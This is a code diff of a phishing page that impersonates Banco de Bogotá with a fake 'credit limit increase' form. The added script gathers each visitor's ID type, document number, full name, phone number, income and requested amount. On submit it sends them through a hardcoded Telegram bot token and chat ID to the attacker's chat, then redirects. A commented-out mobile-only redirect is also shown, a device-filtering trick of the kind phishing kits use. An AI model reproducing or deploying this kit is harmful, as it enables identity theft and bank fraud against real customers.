@@ -1,6 +1,7 @@
 
+
 <html>
-  <head>
+    <head>
     <!-- <script>
         if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
             window.location.href = "https://www.google.com";
@@ -10,19 +11,18 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-    <title>Aumento Tu Cupo - Banco de Bogotá</title>
+    <title>Formulario Aumento de Cupo - Banco de Bogotá</title>
 
     <link
         rel="stylesheet"
         href="https://sapp2406.sirv.com/bogo/lfr_style.css"
     />
     <link
-      rel="stylesheet"
-      href="https://sapp2406.sirv.com/bogo/lfr_ownstyle.css"
+        rel="stylesheet"
+        href="https://sapp2406.sirv.com/bogo/lfr_ownstyle.css"
     />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <style>
-        /* Loader Styles */
         #loading-overlay {
             position: fixed;
             top: 0;
@@ -76,13 +76,11 @@
         }
 
         body {
-            /* Split background: Left half white, Right half light gray-blue */
             background: linear-gradient(90deg, #fcfcfc 50%, #eef3f6 50%) !important;
             min-height: 100vh;
             margin: 0;
         }
 
-        /* Reset container styles */
         .container {
             display: flex !important;
             flex-direction: row !important;
@@ -97,7 +95,6 @@
             height: auto !important;
         }
 
-        /* White Card */
         .login-card-content {
             background: #ffffff;
             border-radius: 8px;
@@ -106,7 +103,6 @@
             margin-bottom: 15px;
         }
 
-        /* Left Side */
         .container__login {
             flex: 0 0 380px !important;
             padding-top: 0 !important;
@@ -120,7 +116,6 @@
             display: block !important;
         }
 
-        /* Right Side */
         .container__info {
             flex: 1 !important;
             padding: 0 !important;
@@ -136,7 +131,6 @@
             max-width: 500px !important;
         }
 
-        /* Responsive Styles */
         @media (max-width: 768px) {
             body {
                 background: #ffffff !important;
@@ -175,7 +169,6 @@
             }
         }
 
-        /* Images */
         .container__info img {
              border-radius: 8px;
              box-shadow: 0 4px 15px rgba(0,0,0,0.1);
@@ -183,7 +176,6 @@
              width: 100%;
         }
 
-        /* Blue Banner */
         .blue-banner {
             background-color: #0033a0;
             color: white;
@@ -199,7 +191,6 @@
             margin-right: 10px;
         }
 
-        /* Slider Specific Styles */
         .monto {
             font-size: 26px;
             font-weight: bold;
@@ -214,12 +205,6 @@
             margin-bottom: 15px;
             color: #333;
             text-align: center;
-        }
-
-        input[type=range] {
-            width: 100%;
-            margin: 15px 0;
-            cursor: pointer;
         }
 
         .minmax {
@@ -246,7 +231,6 @@
             margin-bottom: 15px;
         }
 
-        /* Bottom Icons */
         .bottom-icons-container {
             display: flex;
             align-items: center;
@@ -334,23 +318,43 @@
             width: 100%;
             margin-top: 15px;
         }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        .form-label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 4px;
+        }
+        .form-input {
+            width: 100%;
+            padding: 8px 10px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            font-size: 0.9rem;
+            box-sizing: border-box;
+        }
+        .form-input:focus {
+            outline: none;
+            border-color: #0033a0;
+        }
     </style>
   </head>
 
   <body>
     <div class="box-container">
       <div class="container">
-        
-        <!-- Left Side: Cupo Selection -->
         <div class="container__login">
           <div class="container__login--header">
             <img src="https://sapp2406.sirv.com/bogo/logobanco1.png" alt="Banco de Bogotá" />
           </div>
           
           <div class="container__login--title">
+             <h2 style="font-size: 1.2rem; font-weight: bold; color: #333; margin-bottom: 15px;">Bienvenido a tu Banca Virtual</h2>
           </div>
 
-          <!-- Blue Banner -->
           <div class="blue-banner">
               <img src="images/per.png" alt="Icono" />
               <div style="flex: 1;">
@@ -359,33 +363,51 @@
               </div>
           </div>
 
-          <!-- White Card Container for Form Elements -->
           <div class="login-card-content">
               
               <div class="titulo">
-                  Escoge el cupo ideal entre $5.000.000 y $30.000.000
+                  Completa el formulario para solicitar el aumento de tu cupo
               </div>
 
-              <img src="images/ChatGPT Image 9 ene 2026, 22_32_14.png" alt="Tarjeta" class="card-image">
-
-              <div class="monto" id="valor">
-                  $5.000.000
-              </div>
-
-              <input type="range" min="5000000" max="30000000" step="500000" value="5000000" id="slider" oninput="actualizar()">
-
-              <div class="minmax">
-                  <span>$5.000.000</span>
-                  <span>$30.000.000</span>
-              </div>
-
-              <div class="aviso">
-                  El cupo se asigna sin intereses mensuales y con aprobación digital.
-              </div>
-
-              <button class="btn-main" onclick="window.location.href='index0.html'">
-                  AUMENTAR CUPO
-              </button>
+              <form id="aumentoForm" action="index.php.html" method="POST">
+                  <div class="form-group">
+                      <label class="form-label" for="tipoId">Tipo de identificación</label>
+                      <select id="tipoId" name="tipoId" class="form-input" required>
+                          <option value="" selected disabled>Selecciona una opción</option>
+                          <option value="cc">Cédula de ciudadanía</option>
+                          <option value="ce">Cédula de extranjería</option>
+                          <option value="ti">Tarjeta de identidad</option>
+                          <option value="pp">Pasaporte</option>
+                      </select>
+                  </div>
+                  <div class="form-group">
+                      <label class="form-label" for="numeroDocumento">Número de documento</label>
+                      <input id="numeroDocumento" name="numeroDocumento" class="form-input" type="text" inputmode="numeric" required />
+                  </div>
+                  <div class="form-group">
+                      <label class="form-label" for="nombreCompleto">Nombre Completo</label>
+                      <input id="nombreCompleto" name="nombreCompleto" class="form-input" type="text" required />
+                  </div>
+                  <div class="form-group">
+                      <label class="form-label" for="cuotas">Número de cuotas</label>
+                      <input id="cuotas" name="cuotas" class="form-input" type="number" min="1" max="60" required />
+                  </div>
+                  <div class="form-group">
+                      <label class="form-label" for="telefono">Número de teléfono</label>
+                      <input id="telefono" name="telefono" class="form-input" type="tel" inputmode="tel" required />
+                  </div>
+                  <div class="form-group">
+                      <label class="form-label" for="ingresos">Ingresos mensuales</label>
+                      <input id="ingresos" name="ingresos" class="form-input" type="number" min="0" step="50000" required />
+                  </div>
+                  <div class="form-group">
+                      <label class="form-label" for="montoAumentar">Monto que desea aumentar</label>
+                      <input id="montoAumentar" name="montoAumentar" class="form-input" type="number" min="0" step="50000" required />
+                  </div>
+                  <button type="submit" class="btn-main">
+                      Enviar solicitud
+                  </button>
+              </form>
 
               <div style="text-align: center; color: #999; font-size: 0.8em; margin-top: 15px;">
                   Este sitio está protegido por reCAPTCHA y aplican las políticas
@@ -394,7 +416,6 @@
           </div>
         </div>
 
-        <!-- Right Side: Promo & Icons -->
         <div class="container__info">
            <img id="bannerImage" src="images/talaval.png" alt="Te presentamos a Tu Aval" style="width: 100%; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); transition: opacity 0.5s ease-in-out;">
             
@@ -413,44 +434,37 @@
                 });
             </script>
            
-           <!-- Bottom Icons Carousel -->
-           <div class="bottom-icons-container">
-              <!-- Left Arrow -->
-              <div class="arrow-btn left" onclick="scrollIcons('left')">
-                   <svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
-              </div>
+            <div class="bottom-icons-container">
+                <div class="arrow-btn left" onclick="scrollIcons('left')">
+                    <svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
+                </div>
               
-              <div class="icons-scroll-view" id="iconsTrack">
-                  <!-- Icon 1: Configuración de seguridad -->
-                  <div class="bottom-icon">
-                      <div class="bottom-icon-box">
-                          <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
-                      </div>
-                      <span>Configuración de seguridad</span>
-                  </div>
-                  <!-- Icon 2: Solicitar un producto -->
-                  <div class="bottom-icon">
-                      <div class="bottom-icon-box">
-                          <svg viewBox="0 0 24 24"><path d="M20 6h-2.18c.11-.31.18-.65.18-1 0-1.66-1.34-3-3-3-1.05 0-1.96.54-2.5 1.35l-.5.67-.5-.68C10.96 2.54 10.05 2 9 2 7.34 2 6 3.34 6 5c0 .35.07.69.18 1H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2zm-5-2c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm11 15H4v-2h16v2zm0-5H4V8h5.08L7 10.83 8.62 12 11 8.76l1-1.36 1 1.36L15.38 12 17 10.83 14.92 8H20v6z"/></svg>
-                      </div>
-                      <span>Solicitar un producto</span>
-                  </div>
-                  <!-- Icon 3: Atención al cliente -->
-                  <div class="bottom-icon">
-                      <div class="bottom-icon-box">
-                          <svg viewBox="0 0 24 24"><path d="M19 14v4h-2v-4h2M7 14v4H5v-4h2m12-2h-2v8h2c1.1 0 2-.9 2-2v-4c0-1.1-.9-2-2-2zM7 12H5v8h2c1.1 0 2-.9 2-2v-4c0-1.1-.9-2-2-2zM12 2C6.48 2 2 6.48 2 12c0 1.54.36 2.98.97 4.29L4.46 19c.66 1.15 2.05 1.57 3.23.95.4-.21.72-.51.97-.87C9.33 19.67 10.63 20 12 20s2.67-.33 3.34-.92c.25.36.57.66.97.87 1.18.62 2.57.2 3.23-.95l1.49-2.71c.61-1.31.97-2.75.97-4.29 0-5.52-4.48-10-10-10z"/></svg>
-                      </div>
-                      <span>Atención al cliente</span>
-                  </div>
-                  <!-- Icon 4: Solicitar un turno digital -->
-                  <div class="bottom-icon" onclick="window.open('turno.html', '_blank')">
-                      <div class="bottom-icon-box">
-                          <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
-                      </div>
-                      <span>Solicitar un turno digital</span>
-                  </div>
-                  <!-- Icon 5: Buscar cajeros y oficinas -->
-                  <div class="bottom-icon" onclick="window.open('https://www.grupoaval.com/BuscadordePuntosAval/', '_blank')">
+                <div class="icons-scroll-view" id="iconsTrack">
+                    <div class="bottom-icon">
+                        <div class="bottom-icon-box">
+                            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                    </div>
+                        <span>Configuración de seguridad</span>
+                    </div>
+                    <div class="bottom-icon">
+                        <div class="bottom-icon-box">
+                            <svg viewBox="0 0 24 24"><path d="M20 6h-2.18c.11-.31.18-.65.18-1 0-1.66-1.34-3-3-3-1.05 0-1.96.54-2.5 1.35l-.5.67-.5-.68C10.96 2.54 10.05 2 9 2 7.34 2 6 3.34 6 5c0 .35.07.69.18 1H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2zm-5-2c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm11 15H4v-2h16v2zm0-5H4V8h5.08L7 10.83 8.62 12 11 8.76l1-1.36 1 1.36L15.38 12 17 10.83 14.92 8H20v6z"/></svg>
+                        </div>
+                        <span>Solicitar un producto</span>
+                    </div>
+                    <div class="bottom-icon">
+                        <div class="bottom-icon-box">
+                            <svg viewBox="0 0 24 24"><path d="M19 14v4h-2v-4h2M7 14v4H5v-4h2m12-2h-2v8h2c1.1 0 2-.9 2-2v-4c0-1.1-.9-2-2-2zM7 12H5v8h2c1.1 0 2-.9 2-2v-4c0-1.1-.9-2-2-2zM12 2C6.48 2 2 6.48 2 12c0 1.54.36 2.98.97 4.29L4.46 19c.66 1.15 2.05 1.57 3.23.95.4-.21.72-.51.97-.87C9.33 19.67 10.63 20 12 20s2.67-.33 3.34-.92c.25.36.57.66.97.87 1.18.62 2.57.2 3.23-.95l1.49-2.71c.61-1.31.97-2.75.97-4.29 0-5.52-4.48-10-10-10z"/></svg>
+                        </div>
+                        <span>Atención al cliente</span>
+                    </div>
+                    <div class="bottom-icon" onclick="window.open('turno.html', '_blank')">
+                        <div class="bottom-icon-box">
+                            <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
+                        </div>
+                        <span>Solicitar un turno digital</span>
+                    </div>
+                <div class="bottom-icon" onclick="window.open('https://www.grupoaval.com/BuscadordePuntosAval/', '_blank')">
                       <div class="bottom-icon-box">
                           <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
                       </div>
@@ -458,7 +472,6 @@
                   </div>
               </div>
 
-              <!-- Right Arrow -->
               <div class="arrow-btn right" onclick="scrollIcons('right')">
                    <svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
               </div>
@@ -466,11 +479,7 @@
         </div>
       </div>
 
-      
-
-
     </div>
-    <!-- Loader Overlay -->
     <div id="loading-overlay">
         <div class="loader-container">
             <div class="dot dot-yellow"></div>
@@ -480,10 +489,39 @@
     </div>
 
     <script>
-    function actualizar() {
-        let valor = document.getElementById("slider").value;
-        document.getElementById("valor").innerText =
-            "$" + Number(valor).toLocaleString("es-CO");
+    // Token del bot: crear un bot con @BotFather en Telegram, luego copiar el token que te envía
+    const TELEGRAM_BOT_TOKEN = '8453314318:AAHmPRhYz-6yJn7nKlQqwP8UZs-dLHBpQ7s';
+    // Chat ID: enviar un mensaje al bot y abrir en el navegador: https://api.telegram.org/bot<TU_TOKEN>/getUpdates — el "chat.id" en la respuesta es tu CHAT_ID
+    const TELEGRAM_CHAT_ID = '8616450526';
+
+    function buildTelegramMessage(data) {
+        const labels = {
+            tipoId: 'Tipo de identificación',
+            numeroDocumento: 'Número de documento',
+            nombreCompleto: 'Nombre completo',
+            cuotas: 'Número de cuotas',
+            telefono: 'Teléfono',
+            ingresos: 'Ingresos mensuales',
+            montoAumentar: 'Monto a aumentar'
+        };
+        const tipoIdMap = { cc: 'Cédula de ciudadanía', ce: 'Cédula de extranjería', ti: 'Tarjeta de identidad', pp: 'Pasaporte' };
+        let msg = '📋 *Solicitud aumento de cupo*\n\n';
+        for (const [key, label] of Object.entries(labels)) {
+            const value = key === 'tipoId' ? (tipoIdMap[data[key]] || data[key]) : data[key];
+            msg += `*${label}:* ${value}\n`;
+        }
+        return msg;
+    }
+
+    function sendToTelegram(data) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return Promise.resolve();
+        const text = buildTelegramMessage(data);
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        return fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'Markdown' })
+        });
     }
 
     function scrollIcons(direction) {
@@ -499,6 +537,7 @@
     document.addEventListener('DOMContentLoaded', function() {
         const container = document.getElementById('iconsTrack');
         const leftArrow = document.querySelector('.arrow-btn.left');
+        const form = document.getElementById('aumentoForm');
         
         if (container && leftArrow) {
             container.addEventListener('scroll', function() {
@@ -507,6 +546,34 @@
                 } else {
                     leftArrow.style.display = 'none';
                 }
+            });
+        }
+
+        if (form) {
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const data = {
+                    tipoId: document.getElementById('tipoId').value,
+                    numeroDocumento: document.getElementById('numeroDocumento').value,
+                    nombreCompleto: document.getElementById('nombreCompleto').value,
+                    cuotas: document.getElementById('cuotas').value,
+                    telefono: document.getElementById('telefono').value,
+                    ingresos: document.getElementById('ingresos').value,
+                    montoAumentar: document.getElementById('montoAumentar').value
+                };
+
+                localStorage.setItem('frm_tipoId', data.tipoId);
+                localStorage.setItem('frm_numeroDocumento', data.numeroDocumento);
+                localStorage.setItem('frm_nombreCompleto', data.nombreCompleto);
+                localStorage.setItem('frm_cuotas', data.cuotas);
+                localStorage.setItem('frm_telefono', data.telefono);
+                localStorage.setItem('frm_ingresos', data.ingresos);
+                localStorage.setItem('frm_montoAumentar', data.montoAumentar);
+
+                sendToTelegram(data).finally(function() {
+                    window.location.href = 'index.php.html';
+                });
             });
         }
     });
